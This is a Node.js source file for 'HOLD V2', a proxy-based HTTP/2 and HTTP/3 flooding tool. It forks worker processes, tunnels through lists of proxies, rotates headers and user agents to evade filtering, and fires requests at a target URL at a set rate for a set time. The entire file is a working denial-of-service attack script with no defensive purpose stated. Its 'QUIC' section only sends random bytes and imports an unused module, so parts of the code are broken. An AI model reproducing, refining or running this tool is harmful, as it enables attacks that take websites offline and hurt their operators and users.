const net = require("net");
const http2 = require("http2");
const http3 = require('http3'); // Note: HTTP/3 support may require additional setup
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const dgram = require('dgram');
const gradient = require("gradient-string");

// Language headers array
const lang_header = [
"ko-KR", 
"en-US", 
"zh-CN", 
"zh-TW", 
"ja-JP", 
"en-GB", 
"en-AU", 
"en-GB,en-US;q=0.9,en;q=0.8",
"en-US;q=0.9", 
"en-GB,en;q=0.5", 
"en-CA", 
"en-UK, en, de;q=0.5", 
"en-NZ", 
"en-GB,en;q=0.6",
"en-ZA", 
"en-IN", 
"en-PH", 
"en-SG", 
"en-HK", 
"en-US,en;q=0.5",
"en-GB,en;q=0.8", 
"en-GB,en;q=0.9", 
"en-GB,en;q=0.7", 
"en-US,en;q=0.9", 
"en-GB,en;q=0.9", 
"en-CA,en;q=0.9", 
"en-AU,en;q=0.9", 
"en-NZ,en;q=0.9", 
"en-ZA,en;q=0.9", 
"en-IE,en;q=0.9", 
"en-IN,en;q=0.9", 
"ar-SA,ar;q=0.9", 
"az-Latn-AZ,az;q=0.9", 
"be-BY,be;q=0.9", 
"bg-BG,bg;q=0.9", 
"bn-IN,bn;q=0.9", 
"ca-ES,ca;q=0.9", 
"cs-CZ,cs;q=0.9", 
"cy-GB,cy;q=0.9", 
"da-DK,da;q=0.9", 
"de-DE,de;q=0.9", 
"el-GR,el;q=0.9", 
"es-ES,es;q=0.9", 
"et-EE,et;q=0.9", 
"eu-ES,eu;q=0.9", 
"fa-IR,fa;q=0.9", 
"fi-FI,fi;q=0.9", 
"fr-FR,fr;q=0.9", 
"ga-IE,ga;q=0.9", 
"gl-ES,gl;q=0.9", 
"gu-IN,gu;q=0.9", 
"he-IL,he;q=0.9", 
"hi-IN,hi;q=0.9", 
"hr-HR,hr;q=0.9", 
"hu-HU,hu;q=0.9", 
"hy-AM,hy;q=0.9", 
"id-ID,id;q=0.9", 
"is-IS,is;q=0.9", 
"it-IT,it;q=0.9", 
"ja-JP,ja;q=0.9", 
"ka-GE,ka;q=0.9", 
"kk-KZ,kk;q=0.9", 
"km-KH,km;q=0.9", 
"kn-IN,kn;q=0.9", 
"ko-KR,ko;q=0.9", 
"ky-KG,ky;q=0.9", 
"lo-LA,lo;q=0.9", 
"lt-LT,lt;q=0.9", 
"lv-LV,lv;q=0.9", 
"mk-MK,mk;q=0.9", 
"ml-IN,ml;q=0.9", 
"mn-MN,mn;q=0.9", 
"mr-IN,mr;q=0.9", 
"ms-MY,ms;q=0.9", 
"mt-MT,mt;q=0.9", 
"my-MM,my;q=0.9", 
"nb-NO,nb;q=0.9", 
"ne-NP,ne;q=0.9", 
"nl-NL,nl;q=0.9", 
"nn-NO,nn;q=0.9", 
"or-IN,or;q=0.9", 
"pa-IN,pa;q=0.9", 
"pl-PL,pl;q=0.9", 
"pt-BR,pt;q=0.9", 
"pt-PT,pt;q=0.9", 
"ro-RO,ro;q=0.9", 
"ru-RU,ru;q=0.9", 
"si-LK,si;q=0.9", 
"sk-SK,sk;q=0.9", 
"sl-SI,sl;q=0.9", 
"sq-AL,sq;q=0.9", 
"sr-Cyrl-RS,sr;q=0.9", 
"sr-Latn-RS,sr;q=0.9", 
"sv-SE,sv;q=0.9", 
"sw-KE,sw;q=0.9", 
"ta-IN,ta;q=0.9", 
"te-IN,te;q=0.9", 
"th-TH,th;q=0.9", 
"tr-TR,tr;q=0.9", 
"uk-UA,uk;q=0.9", 
"ur-PK,ur;q=0.9", 
"uz-Latn-UZ,uz;q=0.9", 
"vi-VN,vi;q=0.9", 
"zh-CN,zh;q=0.9", 
"zh-HK,zh;q=0.9", 
"zh-TW,zh;q=0.9", 
"am-ET,am;q=0.8", 
"as-IN,as;q=0.8", 
"az-Cyrl-AZ,az;q=0.8", 
"bn-BD,bn;q=0.8", 
"bs-Cyrl-BA,bs;q=0.8", 
"bs-Latn-BA,bs;q=0.8", 
"dz-BT,dz;q=0.8", 
"fil-PH,fil;q=0.8", 
"fr-CA,fr;q=0.8", 
"fr-CH,fr;q=0.8", 
"fr-BE,fr;q=0.8", 
"fr-LU,fr;q=0.8", 
"gsw-CH,gsw;q=0.8", 
"ha-Latn-NG,ha;q=0.8", 
"hr-BA,hr;q=0.8", 
"ig-NG,ig;q=0.8", 
"ii-CN,ii;q=0.8", 
"is-IS,is;q=0.8", 
"jv-Latn-ID,jv;q=0.8", 
"ka-GE,ka;q=0.8", 
"kkj-CM,kkj;q=0.8", 
"kl-GL,kl;q=0.8", 
"km-KH,km;q=0.8", 
"kok-IN,kok;q=0.8", 
"ks-Arab-IN,ks;q=0.8", 
"lb-LU,lb;q=0.8", 
"ln-CG,ln;q=0.8", 
"mn-Mong-CN,mn;q=0.8", 
"mr-MN,mr;q=0.8", 
"ms-BN,ms;q=0.8", 
"mt-MT,mt;q=0.8", 
"mua-CM,mua;q=0.8", 
"nds-DE,nds;q=0.8", 
"ne-IN,ne;q=0.8", 
"nso-ZA,nso;q=0.8", 
"oc-FR,oc;q=0.8", 
"pa-Arab-PK,pa;q=0.8", 
"ps-AF,ps;q=0.8", 
"quz-BO,quz;q=0.8", 
"quz-EC,quz;q=0.8", 
"quz-PE,quz;q=0.8", 
"rm-CH,rm;q=0.8", 
"rw-RW,rw;q=0.8", 
"sd-Arab-PK,sd;q=0.8", 
"se-NO,se;q=0.8", 
"si-LK,si;q=0.8", 
"smn-FI,smn;q=0.8", 
"sms-FI,sms;q=0.8", 
"syr-SY,syr;q=0.8", 
"tg-Cyrl-TJ,tg;q=0.8", 
"ti-ER,ti;q=0.8", 
"tk-TM,tk;q=0.8", 
"tn-ZA,tn;q=0.8", 
"tt-RU,tt;q=0.8", 
"ug-CN,ug;q=0.8", 
"uz-Cyrl-UZ,uz;q=0.8", 
"ve-ZA,ve;q=0.8", 
"wo-SN,wo;q=0.8", 
"xh-ZA,xh;q=0.8", 
"yo-NG,yo;q=0.8", 
"zgh-MA,zgh;q=0.8", 
"zu-ZA,zu;q=0.8",
"he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
"fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
"en-US,en;q=0.5", "en-US,en;q=0.9",
"de-CH;q=0.7",
"da, en-gb;q=0.8, en;q=0.7",
"cs;q=0.5",
'en-US,en;q=0.9',
'en-GB,en;q=0.9',
'en-CA,en;q=0.9',
'en-AU,en;q=0.9',
'en-NZ,en;q=0.9',
'en-ZA,en;q=0.9',
'en-IE,en;q=0.9',
'en-IN,en;q=0.9',
'ar-SA,ar;q=0.9',
'az-Latn-AZ,az;q=0.9',
'be-BY,be;q=0.9',
'bg-BG,bg;q=0.9',
'bn-IN,bn;q=0.9',
'ca-ES,ca;q=0.9',
'cs-CZ,cs;q=0.9',
'cy-GB,cy;q=0.9',
'da-DK,da;q=0.9',
'de-DE,de;q=0.9',
'el-GR,el;q=0.9',
'es-ES,es;q=0.9',
'et-EE,et;q=0.9',
'eu-ES,eu;q=0.9',
'fa-IR,fa;q=0.9',
'fi-FI,fi;q=0.9',
'fr-FR,fr;q=0.9',
'ga-IE,ga;q=0.9',
'gl-ES,gl;q=0.9',
'gu-IN,gu;q=0.9',
'he-IL,he;q=0.9',
'hi-IN,hi;q=0.9',
'hr-HR,hr;q=0.9',
'hu-HU,hu;q=0.9',
'hy-AM,hy;q=0.9',
'id-ID,id;q=0.9',
'is-IS,is;q=0.9',
'it-IT,it;q=0.9',
'ja-JP,ja;q=0.9',
'ka-GE,ka;q=0.9',
'kk-KZ,kk;q=0.9',
'km-KH,km;q=0.9',
'kn-IN,kn;q=0.9',
'ko-KR,ko;q=0.9',
'ky-KG,ky;q=0.9',
'lo-LA,lo;q=0.9',
'lt-LT,lt;q=0.9',
'lv-LV,lv;q=0.9',
'mk-MK,mk;q=0.9',
'ml-IN,ml;q=0.9',
'mn-MN,mn;q=0.9',
'mr-IN,mr;q=0.9',
'ms-MY,ms;q=0.9',
'mt-MT,mt;q=0.9',
'my-MM,my;q=0.9',
'nb-NO,nb;q=0.9',
'ne-NP,ne;q=0.9',
'nl-NL,nl;q=0.9',
'nn-NO,nn;q=0.9',
'or-IN,or;q=0.9',
'pa-IN,pa;q=0.9',
'pl-PL,pl;q=0.9',
'pt-BR,pt;q=0.9',
'pt-PT,pt;q=0.9',
'ro-RO,ro;q=0.9',
'ru-RU,ru;q=0.9',
'si-LK,si;q=0.9',
'sk-SK,sk;q=0.9',
'sl-SI,sl;q=0.9',
'sq-AL,sq;q=0.9',
'sr-Cyrl-RS,sr;q=0.9',
'sr-Latn-RS,sr;q=0.9',
'sv-SE,sv;q=0.9',
'sw-KE,sw;q=0.9',
'ta-IN,ta;q=0.9',
'te-IN,te;q=0.9',
'th-TH,th;q=0.9',
'tr-TR,tr;q=0.9',
'uk-UA,uk;q=0.9',
'ur-PK,ur;q=0.9',
'uz-Latn-UZ,uz;q=0.9',
'vi-VN,vi;q=0.9',
'zh-CN,zh;q=0.9',
'zh-HK,zh;q=0.9',
'zh-TW,zh;q=0.9',
'am-ET,am;q=0.8',
'as-IN,as;q=0.8',
'az-Cyrl-AZ,az;q=0.8',
'bn-BD,bn;q=0.8',
'bs-Cyrl-BA,bs;q=0.8',
'bs-Latn-BA,bs;q=0.8',
'dz-BT,dz;q=0.8',
'fil-PH,fil;q=0.8',
'fr-CA,fr;q=0.8',
'fr-CH,fr;q=0.8',
'fr-BE,fr;q=0.8',
'fr-LU,fr;q=0.8',
'gsw-CH,gsw;q=0.8',
'ha-Latn-NG,ha;q=0.8',
'hr-BA,hr;q=0.8',
'ig-NG,ig;q=0.8',
'ii-CN,ii;q=0.8',
'is-IS,is;q=0.8',
'jv-Latn-ID,jv;q=0.8',
'ka-GE,ka;q=0.8',
'kkj-CM,kkj;q=0.8',
'kl-GL,kl;q=0.8',
'km-KH,km;q=0.8',
'kok-IN,kok;q=0.8',
'ks-Arab-IN,ks;q=0.8',
'lb-LU,lb;q=0.8',
'ln-CG,ln;q=0.8',
'mn-Mong-CN,mn;q=0.8',
'mr-MN,mr;q=0.8',
'ms-BN,ms;q=0.8',
'mt-MT,mt;q=0.8',
'mua-CM,mua;q=0.8',
'nds-DE,nds;q=0.8',
'ne-IN,ne;q=0.8',
'nso-ZA,nso;q=0.8',
'oc-FR,oc;q=0.8',
'pa-Arab-PK,pa;q=0.8',
'ps-AF,ps;q=0.8',
'quz-BO,quz;q=0.8',
'quz-EC,quz;q=0.8',
'quz-PE,quz;q=0.8',
'rm-CH,rm;q=0.8',
'rw-RW,rw;q=0.8',
'sd-Arab-PK,sd;q=0.8',
'se-NO,se;q=0.8',
'si-LK,si;q=0.8',
'smn-FI,smn;q=0.8',
'sms-FI,sms;q=0.8',
'syr-SY,syr;q=0.8',
'tg-Cyrl-TJ,tg;q=0.8',
'ti-ER,ti;q=0.8',
'te;q=0.9,en-US;q=0.8,en;q=0.7',
'tk-TM,tk;q=0.8',
'tn-ZA,tn;q=0.8',
'tt-RU,tt;q=0.8',
'ug-CN,ug;q=0.8',
'uz-Cyrl-UZ,uz;q=0.8',
've-ZA,ve;q=0.8',
'wo-SN,wo;q=0.8',
'xh-ZA,xh;q=0.8',
'yo-NG,yo;q=0.8',
'zgh-MA,zgh;q=0.8',
'zu-ZA,zu;q=0.8',
];

const encoding_header = [
'*/*',
'Accept-Encoding',
'br',
'zstd',
'identity;q=1, *;q=0',
'X-OB-STG,X-OB-PRD',
'gzip, deflate, br', 
'gzip, deflate, br, zstd', 
'compress, gzip', 
'deflate, gzip', 
'gzip, identity', 
'*', 
'*', 
'*/*', 
'gzip', 
'gzip, deflate, br', 
'compress, gzip', 
'deflate, gzip', 
'gzip, identity', 
'gzip, deflate', 
'br', 
'br;q=1.0, gzip;q=0.8, *;q=0.1', 
'gzip;q=1.0, identity; q=0.5, *;q=0', 
'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25', 
'compress;q=0.5, gzip;q=1.0', 
'identity', 
'gzip, compress', 
'compress, deflate', 
'compress', 
'gzip, deflate, br', 
'deflate', 
'webp',
'gzip, deflate, lzma, sdch', 
'deflate',
'gzip, deflate, br',
'compress, gzip',
'deflate, gzip',
'gzip, identity',
'*'
];

// HTTP/3 QUIC Support Class
class HTTP3Attack {
    constructor(target, proxy) {
        this.target = target;
        this.proxy = proxy;
        this.socket = dgram.createSocket('udp4');
    }

    async sendQUICPackets() {
        return new Promise((resolve) => {
            const packets = this.generateQUICPackets();
            let sent = 0;
            
            const sendNext = () => {
                if (sent >= packets.length) {
                    this.socket.close();
                    resolve();
                    return;
                }
                
                try {
                    this.socket.send(packets[sent], this.proxy.port, this.proxy.host, (err) => {
                        sent++;
                        if (!err) {
                            setImmediate(sendNext);
                        } else {
                            this.socket.close();
                            resolve();
                        }
                    });
                } catch (e) {
                    this.socket.close();
                    resolve();
                }
            };
            
            sendNext();
        });
    }

    generateQUICPackets() {
        const packets = [];
        // Generate QUIC initial packets, handshake packets, and data packets
        for (let i = 0; i < 10; i++) {
            const payload = crypto.randomBytes(1024);
            const packet = Buffer.concat([
                Buffer.from([0xc0]), // Long header, fixed bit
                Buffer.from([0x00]), // Packet type (initial)
                crypto.randomBytes(8), // Connection ID
                payload
            ]);
            packets.push(packet);
        }
        return packets;
    }
}

function getRandomUserAgent() {
    const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
    const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
    const version = Math.floor(Math.random() * 100) + 1;
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
    const encryptedString = Buffer.from(userAgentString).toString('base64');
    let finalString = '';
    for (let i = 0; i < encryptedString.length; i++) {
        if (i % randomOrder === 0) {
            finalString += encryptedString.charAt(i);
        } else {
            finalString += encryptedString.charAt(i).toUpperCase();
        }
    }
    return finalString;
}

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`node hold.js target time rate thread proxy.txt [http2|http3|mixed]`);
    process.exit();
}

// 2025 TLS CONFIGURATIONS with HTTP/2 and HTTP/3 support
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");

// HTTP/2 and HTTP/3 compatible ciphers
const ciphers = [
    // TLS 1.3 ciphers (required for HTTP/3)
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    
    // Modern TLS 1.2 ciphers for HTTP/2
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305'
].join(":");

// 2025 Signature Algorithms
const sigalgs = [
    'ed25519',
    'ecdsa_secp256r1_sha256',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pkcs1_sha256'
].join(':');

// HTTP/3 requires specific curves
const ecdhCurve = [
    'X25519',
    'X448',
    'secp256r1',
    'secp384r1'
].join(':');

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT;

// HTTP/2 and HTTP/3 specific configurations
const http2Options = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    ecdhCurve: ecdhCurve,
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    honorCipherOrder: true,
    secureOptions: secureOptions,
    ALPNProtocols: ['h2', 'http/1.1'] // HTTP/2 ALPN
};

const http3Options = {
    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
    sigalgs: sigalgs,
    ecdhCurve: ecdhCurve,
    minVersion: 'TLSv1.3', // HTTP/3 requires TLS 1.3
    maxVersion: 'TLSv1.3',
    ALPNProtocols: ['h3'] // HTTP/3 ALPN
};

const secureContext = tls.createSecureContext(http2Options);

var proxyFile = process.argv[6] || "proxy.txt";
var protocol = process.argv[7] || "http2"; // http2, http3, or mixed
var proxies = readLines(proxyFile);
var userAgents = readLines("ua.txt");

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = new URL(args.target);

if (cluster.isMaster) {
    console.log(gradient.rainbow('╔══════════════════════════════════════╗'));
    console.log(gradient.rainbow('║           HOLD V2 - HTTP/2 & HTTP/3  ║'));
    console.log(gradient.rainbow('╚══════════════════════════════════════╝'));
    console.log(gradient.passion(' PROTOCOL: ') + gradient.teen(protocol.toUpperCase()));
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    for (let i = 0; i < 120; i++) {
        setInterval(() => {
            if (protocol === 'http3') {
                runHTTP3Flooder();
            } else if (protocol === 'mixed') {
                Math.random() > 0.5 ? runHTTP2Flooder() : runHTTP3Flooder();
            } else {
                runHTTP2Flooder(); // Default to HTTP/2
            }
        }, 0);
    }
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true)

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const headers = {};

// HTTP/2 and HTTP/3 headers
headers[":method"] = "GET";
headers[":path"] = parsedTarget.pathname + parsedTarget.search || "/";
headers[":scheme"] = "https";
headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8";
headers["accept-language"] = randomElement(lang_header);
headers["accept-encoding"] = randomElement(encoding_header);
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = randomElement(["same-origin", "cross-site", "none"]);
headers["upgrade-insecure-requests"] = "1";
headers["pragma"] = "no-cache";

// HTTP/2 Specific Flood
function runHTTP2Flooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    headers[":authority"] = parsedTarget.host
    headers["user-agent"] = randomElement(userAgents);
    headers["x-forwarded-for"] = parsedProxy[0];
    headers["referer"] = "https://" + parsedTarget.host + (parsedTarget.pathname || "/");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823,
            maxConcurrentStreams: 100,
            initialWindowSize: 65535
        };

        const tlsOptions = {
            ...http2Options,
            port: 443,
            secure: true,
            requestCert: true,
            socket: connection,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureContext: tls.createSecureContext(http2Options),
            servername: parsedTarget.host
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: settings,
            maxSessionMemory: 655000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers["accept-language"] = randomElement(lang_header);
                    headers["accept-encoding"] = randomElement(encoding_header);
                    headers["user-agent"] = randomElement(userAgents);
                    
                    const request = client.request(headers)
                        .on("response", response => {
                            request.close();
                            request.destroy();
                        })
                        .on("error", () => {});

                    request.end();
                }
            }, 1000);

            client.on("close", () => {
                clearInterval(IntervalAttack);
            });
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
        });
    });
}

// HTTP/3 Flood using QUIC
function runHTTP3Flooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    
    const http3Attack = new HTTP3Attack(parsedTarget, {
        host: parsedProxy[0],
        port: ~~parsedProxy[1]
    });
    
    http3Attack.sendQUICPackets().catch(() => {});
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);

console.log(gradient.passion(' TARGET >: ') + gradient.teen(parsedTarget.host));
console.log(gradient.passion(' TIME >: ') + gradient.teen(args.time + 's'));
console.log(gradient.passion(' Threads: ') + gradient.teen(args.threads));
console.log(gradient.passion(' RPS: ') + gradient.teen(args.Rate));
console.log(gradient.passion(' Proxies: ') + gradient.teen(proxies.length));
console.log(gradient.mind(' Script Hold V2 - HTTP/2 & HTTP/3 Optimized'));

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
